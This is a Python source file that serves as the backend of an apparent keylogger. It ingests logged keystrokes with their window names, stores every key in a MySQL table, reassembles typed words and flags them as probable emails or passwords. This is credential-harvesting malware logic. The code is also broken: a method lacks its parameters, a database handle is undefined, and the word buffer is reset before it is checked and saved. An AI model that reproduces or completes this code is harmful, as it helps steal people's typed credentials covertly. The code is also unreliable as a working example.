from load_config import load_cfg, db_cursor
import mysql.connector
import json

class Process:
    def __init__(self):
        self.word = ""
        self.payload = {
            "datetime": "",
            "epoch": "",
            "windowName": "",
            "processedWord":"",
            "isEmail": 0,
            "isPassword": 0
        }
        
    def addKey(self, data):
        payload = json.loads(data)
        self.pushDB_keys(payload)
        self.appendWord(payload)
    
    def pushDB_keys():
        (main_cfg, mycursor) = db_cursor()
        sql = f"INSERT INTO {main_cfg['dbKeyTable']} {main_cfg['dbRows']} VALUES (%s, %s, %s, %s, %s, %s,%s, %s, %s)"
        val = (f"{payload['datetime']}", f"{payload['epochTime']}", f"{payload['isKeyDown']}", f"{payload['windowName']}", f"{payload['asciiCode']}", f"{payload['asciiChar']}", f"{payload['keyName']}", f"{payload['isCaps']}", f"{payload['processedKey']}")
  
        mycursor.execute(sql, val)
  
        db.commit()
        mycursor.close()
        db.close()
        
        return 0
    
    def appendWord(self,data):
    #loop through items in log and append characters on key-down
        if (data['processedKey']):
            if (len(self.word) == 0):
                self.payload['datetime'] = data['datetime']
                self.payload['epoch'] = data['epochTime']
                self.payload['windowName'] = data['windowName']
            self.word += data['processedKey']
        else:
            #TODO: if last word, add the time pressed as end time
            print("words: "+ self.payload['processedWord'])
            self.payload['processedWord'] = self.word
            self.resetWord()
            self.checkEmailPassword()
            self.pushDB_word()
            
        return 0
                
    def checkEmailPassword(self):
    #check the processedWord of the payload to determine if possible email or password
        check_word = self.payload['processedWord']
        if "@" in check_word:
            self.payload['isEmail'] = 1
        
        elif (not check_word.isalpha() and not check_word.isdigit()):
            #a high level filtering for words which are a mix of alphabet and digits, suggesting they are possible passwords
            self.payload['isPassword'] = 1
            
    
    def pushDB_word(self):
    #push to table words
        (main_cfg, mycursor) = db_cursor()

        sql = f"INSERT INTO {main_cfg['dbWordTable']} {main_cfg['dbWordRows']} VALUES (%s, %s, %s, %s, %s, %s)"
        val = (f"{self.payload['datetime']}", f"{self.payload['epoch']}", f"{self.payload['windowName']}", f"{self.payload['processedWord']}",f"{self.payload['isEmail']}", f"{self.payload['isPassword']}")
        
        print(sql,val)
        
        mycursor.execute(sql, val)
        self.payload['processedWord'] = ""
        
        db.commit()    
        mycursor.close()
        db.close()
        
        return 0 
        
    def resetWord(self):
        self.word = ""
        self.payload = {
            "datetime": "",
            "epoch": "",
            "windowName": "",
            "processedWord":"",
            "isEmail": 0,
            "isPassword": 0
        }
        
    
    
    
